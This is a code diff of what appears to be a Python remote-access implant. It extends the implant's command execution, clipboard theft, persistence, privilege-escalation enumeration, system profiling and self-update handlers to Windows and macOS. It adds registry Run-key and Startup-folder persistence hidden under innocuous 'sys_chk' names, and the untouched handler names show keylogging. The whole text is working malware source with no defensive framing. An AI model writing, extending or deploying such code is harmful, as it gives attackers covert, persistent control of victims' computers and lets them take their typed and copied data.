@@ -112,8 +112,11 @@ def handle_execute(task):
     if not cmd_str:
         return {"ok": False, "error": "No command specified", "command": ""}
     try:
-        command = shlex.split(cmd_str)
-        res = subprocess.run(command, capture_output=True, text=True, timeout=120)
+        if platform.system() == "Windows":
+            # On Windows, use shell=True so cmd.exe builtins (dir, echo, etc.) work
+            res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=120)
+        else:
+            res = subprocess.run(shlex.split(cmd_str), capture_output=True, text=True, timeout=120)
         return {"ok": True, "output": res.stdout + res.stderr, "command": cmd_str}
     except subprocess.TimeoutExpired:
         return {"ok": False, "error": "Command timed out (120s)", "command": cmd_str}
@@ -324,6 +327,25 @@ def handle_keylog_stop(_task):
 
 
 def handle_clipboard(_task):
+    sys_plat = platform.system()
+    # Windows: PowerShell Get-Clipboard
+    if sys_plat == "Windows":
+        try:
+            r = subprocess.run(
+                ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
+                capture_output=True, text=True, timeout=10
+            )
+            return {"ok": True, "output": r.stdout}
+        except Exception as e:
+            return {"ok": False, "error": f"clipboard: {e}"}
+    # macOS: pbpaste
+    if sys_plat == "Darwin":
+        try:
+            r = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=5)
+            return {"ok": True, "output": r.stdout}
+        except Exception as e:
+            return {"ok": False, "error": f"clipboard: {e}"}
+    # Linux: pyperclip, then xclip/xsel/wl-paste
     try:
         import pyperclip
         return {"ok": True, "output": pyperclip.paste()}
@@ -346,23 +368,60 @@ def _script_path():
 
 
 def handle_persist(task):
-    method      = task.get("method", "crontab")
-    spath       = _script_path()
-    marker      = f"# .sys_chk_{os.path.basename(spath)}"
+    method = task.get("method", "crontab")
+    spath  = _script_path()
+    marker = f"# .sys_chk_{os.path.basename(spath)}"
+    sys_plat = platform.system()
 
+    # ── Windows persistence ────────────────────────────────────────────────────
+    if sys_plat == "Windows":
+        if method in ("registry", "crontab"):  # "crontab" is the default; map to registry on Windows
+            try:
+                import winreg
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                val_name = f"SysChk_{os.path.basename(spath)[:20]}"
+                cmd_val  = f'"{sys.executable}" "{spath}"'
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
+                                    winreg.KEY_READ | winreg.KEY_WRITE) as k:
+                    try:
+                        existing, _ = winreg.QueryValueEx(k, val_name)
+                        if existing == cmd_val:
+                            return {"ok": True, "output": f"Already persisted in registry: {val_name}"}
+                    except FileNotFoundError:
+                        pass
+                    winreg.SetValueEx(k, val_name, 0, winreg.REG_SZ, cmd_val)
+                return {"ok": True, "output": f"Installed registry Run key: {val_name}"}
+            except Exception as e:
+                return {"ok": False, "error": f"registry persist: {e}"}
+
+        if method == "startup":
+            try:
+                startup = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
+                bat     = os.path.join(startup, "sys_chk.bat")
+                if os.path.exists(bat):
+                    return {"ok": True, "output": f"Already persisted in startup: {bat}"}
+                with open(bat, "w") as f:
+                    f.write(f'@echo off\nstart "" "{sys.executable}" "{spath}"\n')
+                return {"ok": True, "output": f"Installed startup bat: {bat}"}
+            except Exception as e:
+                return {"ok": False, "error": f"startup persist: {e}"}
+
+        return {"ok": False, "error": f"Unknown Windows persist method: {method} (use: registry, startup)"}
+
+    # ── POSIX persistence (Linux + macOS) ──────────────────────────────────────
     if method == "crontab":
         try:
             res     = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
             current = res.stdout if res.returncode == 0 else ""
             if spath in current:
                 return {"ok": True, "output": f"Already persisted in crontab: {spath}"}
-            entry   = f"@reboot {sys.executable} {spath}\n"
+            entry = f"@reboot {sys.executable} {spath}\n"
             subprocess.run(["crontab", "-"], input=current + entry, text=True, check=True)
             return {"ok": True, "output": f"Installed crontab entry for {spath}"}
         except Exception as e:
             return {"ok": False, "error": str(e)}
 
-    elif method == "bashrc":
+    if method == "bashrc":
         bashrc = os.path.expanduser("~/.bashrc")
         try:
             with open(bashrc, "r") as f:
@@ -375,7 +434,7 @@ def handle_persist(task):
         except Exception as e:
             return {"ok": False, "error": str(e)}
 
-    elif method == "systemd":
+    if method == "systemd":
         try:
             unit_name = f"sys_chk_{os.path.basename(spath).replace('.', '_')}.service"
             unit_dir  = os.path.expanduser("~/.config/systemd/user")
@@ -396,10 +455,40 @@ def handle_persist(task):
 
 
 def handle_unpersist(_task):
-    spath   = _script_path()
-    marker  = f"# .sys_chk_{os.path.basename(spath)}"
-    removed = []
+    spath    = _script_path()
+    marker   = f"# .sys_chk_{os.path.basename(spath)}"
+    removed  = []
+    sys_plat = platform.system()
 
+    # ── Windows unpersist ──────────────────────────────────────────────────────
+    if sys_plat == "Windows":
+        # Registry Run key
+        try:
+            import winreg
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            val_name = f"SysChk_{os.path.basename(spath)[:20]}"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
+                                winreg.KEY_READ | winreg.KEY_WRITE) as k:
+                try:
+                    winreg.DeleteValue(k, val_name)
+                    removed.append(f"registry:{val_name}")
+                except FileNotFoundError:
+                    pass
+        except Exception:
+            pass
+        # Startup folder bat
+        try:
+            bat = os.path.join(os.environ.get("APPDATA", ""),
+                               r"Microsoft\Windows\Start Menu\Programs\Startup\sys_chk.bat")
+            if os.path.exists(bat):
+                os.remove(bat)
+                removed.append("startup:sys_chk.bat")
+        except Exception:
+            pass
+        msg = f"Removed: {', '.join(removed)}" if removed else "No Windows persistence found"
+        return {"ok": True, "output": msg}
+
+    # ── POSIX unpersist (Linux + macOS) ───────────────────────────────────────
     # Crontab
     try:
         res = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
@@ -432,24 +521,79 @@ def handle_unpersist(_task):
     except Exception:
         pass
 
-    # Systemd
-    try:
-        unit_name = f"sys_chk_{os.path.basename(spath).replace('.', '_')}.service"
-        unit_path = os.path.join(os.path.expanduser("~/.config/systemd/user"), unit_name)
-        if os.path.exists(unit_path):
-            subprocess.run(["systemctl", "--user", "disable", unit_name], capture_output=True)
-            os.remove(unit_path)
-            removed.append(f"systemd:{unit_name}")
-    except Exception:
-        pass
+    # macOS LaunchAgent
+    if sys_plat == "Darwin":
+        try:
+            plist = os.path.expanduser("~/Library/LaunchAgents/com.sys.check.plist")
+            if os.path.exists(plist):
+                subprocess.run(["launchctl", "unload", plist], capture_output=True)
+                os.remove(plist)
+                removed.append("launchagent")
+        except Exception:
+            pass
+
+    # Systemd (Linux only)
+    if sys_plat == "Linux":
+        try:
+            unit_name = f"sys_chk_{os.path.basename(spath).replace('.', '_')}.service"
+            unit_path = os.path.join(os.path.expanduser("~/.config/systemd/user"), unit_name)
+            if os.path.exists(unit_path):
+                subprocess.run(["systemctl", "--user", "disable", unit_name], capture_output=True)
+                os.remove(unit_path)
+                removed.append(f"systemd:{unit_name}")
+        except Exception:
+            pass
 
     msg = f"Removed persistence from: {', '.join(removed)}" if removed else "No persistence entries found"
     return {"ok": True, "output": msg}
 
 
 def handle_privesc_enum(_task):
-    lines = []
+    lines    = []
+    sys_plat = platform.system()
 
+    # ── Windows privesc ────────────────────────────────────────────────────────
+    if sys_plat == "Windows":
+        lines.append("[ID]")
+        try:
+            r = subprocess.run(["whoami", "/all"], capture_output=True, text=True, timeout=10)
+            lines.append(r.stdout.strip())
+        except Exception as e:
+            lines.append(f"error: {e}")
+
+        lines.append("\n[SUDO]")
+        try:
+            r = subprocess.run(["net", "localgroup", "administrators"],
+                               capture_output=True, text=True, timeout=10)
+            lines.append(r.stdout.strip() or "(none)")
+        except Exception as e:
+            lines.append(f"error: {e}")
+
+        lines.append("\n[SUID]")
+        lines.append("(not applicable on Windows)")
+
+        lines.append("\n[WRITABLE /etc]")
+        lines.append("(not applicable on Windows)")
+
+        lines.append("\n[CAPABILITIES]")
+        try:
+            r = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=10)
+            lines.append(r.stdout.strip() or "(none)")
+        except Exception as e:
+            lines.append(f"error: {e}")
+
+        lines.append("\n[ENVIRONMENT]")
+        try:
+            env = {k: v for k, v in os.environ.items()
+                   if any(k.upper().startswith(p) for p in ("PATH", "USERNAME", "USERPROFILE",
+                                                              "SYSTEMROOT", "COMSPEC", "TEMP"))}
+            lines.append("\n".join(f"{k}={v}" for k, v in env.items()))
+        except Exception as e:
+            lines.append(f"error: {e}")
+
+        return {"ok": True, "output": "\n".join(lines)}
+
+    # ── POSIX privesc (Linux + macOS) ─────────────────────────────────────────
     lines.append("[ID]")
     try:
         r = subprocess.run(["id"], capture_output=True, text=True)
@@ -491,18 +635,23 @@ def handle_privesc_enum(_task):
 
     lines.append("\n[CAPABILITIES]")
     try:
-        r = subprocess.run(
-            ["getcap", "-r", "/usr/bin", "/usr/sbin", "/bin", "/sbin"],
-            capture_output=True, text=True, timeout=10
-        )
+        if sys_plat == "Darwin":
+            r = subprocess.run(["csrutil", "status"], capture_output=True, text=True, timeout=10)
+        else:
+            r = subprocess.run(
+                ["getcap", "-r", "/usr/bin", "/usr/sbin", "/bin", "/sbin"],
+                capture_output=True, text=True, timeout=10
+            )
         lines.append(r.stdout.strip() or "(none)")
     except Exception as e:
         lines.append(f"error: {e}")
 
     lines.append("\n[ENVIRONMENT]")
     try:
+        prefixes = ("LD_", "DYLD_", "PATH", "HOME", "USER", "SUDO") if sys_plat != "Darwin" \
+                   else ("DYLD_", "PATH", "HOME", "USER", "SUDO")
         env = {k: v for k, v in os.environ.items()
-               if any(k.startswith(p) for p in ("LD_", "DYLD_", "PATH", "HOME", "USER", "SUDO"))}
+               if any(k.startswith(p) for p in prefixes)}
         lines.append("\n".join(f"{k}={v}" for k, v in env.items()))
     except Exception as e:
         lines.append(f"error: {e}")
@@ -528,10 +677,13 @@ def handle_exec_python(task):
 
 
 def handle_sysinfo(_task):
+    import datetime as _dt
+    import re as _re
     try:
+        sys_plat = platform.system()
         lines = [
             f"Hostname: {platform.node()}",
-            f"OS: {platform.system()} {platform.release()} {platform.version()}",
+            f"OS: {sys_plat} {platform.release()} {platform.version()}",
             f"Arch: {platform.machine()}",
             f"User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}",
             f"PID: {os.getpid()}",
@@ -539,39 +691,86 @@ def handle_sysinfo(_task):
 
         # Memory
         try:
-            if platform.system() == "Linux":
+            if sys_plat == "Windows":
+                r = subprocess.run(
+                    ["wmic", "OS", "get", "TotalVisibleMemorySize", "/Value"],
+                    capture_output=True, text=True, timeout=10
+                )
+                for ln in r.stdout.splitlines():
+                    if ln.strip().startswith("TotalVisibleMemorySize="):
+                        kb = int(ln.split("=", 1)[1].strip())
+                        lines.append(f"Memory: {kb // 1024} MB")
+                        break
+                else:
+                    lines.append("Memory: unknown")
+            elif sys_plat == "Linux":
                 with open("/proc/meminfo") as f:
-                    for line in f:
-                        if line.startswith("MemTotal:"):
-                            lines.append(f"Memory: {line.split(':')[1].strip()}")
+                    for ln in f:
+                        if ln.startswith("MemTotal:"):
+                            lines.append(f"Memory: {ln.split(':')[1].strip()}")
                             break
-            elif platform.system() == "Darwin":
-                r = subprocess.run(["sysctl", "-n", "hw.memsize"], capture_output=True, text=True)
-                lines.append(f"Memory: {int(r.stdout.strip()) // (1024*1024)} MB")
+            elif sys_plat == "Darwin":
+                r = subprocess.run(["sysctl", "-n", "hw.memsize"],
+                                   capture_output=True, text=True, timeout=5)
+                lines.append(f"Memory: {int(r.stdout.strip()) // (1024 * 1024)} MB")
             else:
                 lines.append("Memory: unknown")
         except Exception:
             lines.append("Memory: unknown")
 
-        # Uptime (Linux only)
+        # Uptime
         try:
-            if platform.system() == "Linux":
+            if sys_plat == "Windows":
+                r = subprocess.run(
+                    ["wmic", "OS", "get", "LastBootUpTime", "/Value"],
+                    capture_output=True, text=True, timeout=10
+                )
+                for ln in r.stdout.splitlines():
+                    if ln.strip().startswith("LastBootUpTime="):
+                        boot_str = ln.split("=", 1)[1].strip().split(".")[0]
+                        boot_dt  = _dt.datetime.strptime(boot_str, "%Y%m%d%H%M%S")
+                        up       = _dt.datetime.now() - boot_dt
+                        h, rem   = divmod(int(up.total_seconds()), 3600)
+                        mi, s    = divmod(rem, 60)
+                        lines.append(f"Uptime: {h}h {mi}m {s}s")
+                        break
+            elif sys_plat == "Linux":
                 with open("/proc/uptime") as f:
                     up = float(f.read().split()[0])
                 h, rem = divmod(int(up), 3600)
                 m, s   = divmod(rem, 60)
                 lines.append(f"Uptime: {h}h {m}m {s}s")
+            elif sys_plat == "Darwin":
+                r   = subprocess.run(["sysctl", "-n", "kern.boottime"],
+                                     capture_output=True, text=True, timeout=5)
+                hit = _re.search(r"sec\s*=\s*(\d+)", r.stdout)
+                if hit:
+                    boot_dt = _dt.datetime.fromtimestamp(int(hit.group(1)))
+                    up      = _dt.datetime.now() - boot_dt
+                    h, rem  = divmod(int(up.total_seconds()), 3600)
+                    mi, s   = divmod(rem, 60)
+                    lines.append(f"Uptime: {h}h {mi}m {s}s")
         except Exception:
             pass
 
-        # CPU model
+        # CPU
         try:
-            if platform.system() == "Linux":
+            if sys_plat == "Linux":
                 with open("/proc/cpuinfo") as f:
-                    for line in f:
-                        if "model name" in line:
-                            lines.append(f"CPU: {line.split(':')[1].strip()}")
+                    for ln in f:
+                        if "model name" in ln:
+                            lines.append(f"CPU: {ln.split(':')[1].strip()}")
                             break
+            elif sys_plat == "Darwin":
+                r   = subprocess.run(["sysctl", "-n", "machdep.cpu.brand_string"],
+                                     capture_output=True, text=True, timeout=5)
+                cpu = r.stdout.strip()
+                if cpu:
+                    lines.append(f"CPU: {cpu}")
+            elif sys_plat == "Windows":
+                cpu = platform.processor()
+                if cpu:
+                    lines.append(f"CPU: {cpu}")
         except Exception:
             pass
 
@@ -938,7 +1137,12 @@ def handle_self_update(task):
 
     def _reexec():
         time.sleep(1)
-        os.execv(sys.executable, [sys.executable, spath])
+        if platform.system() == "Windows":
+            _DETACHED = 0x00000008
+            subprocess.Popen([sys.executable, spath], creationflags=_DETACHED)
+            sys.exit(0)
+        else:
+            os.execv(sys.executable, [sys.executable, spath])
 
     threading.Thread(target=_reexec, daemon=True).start()
     return {"ok": True, "output": "Script updated — re-executing in 1s"}
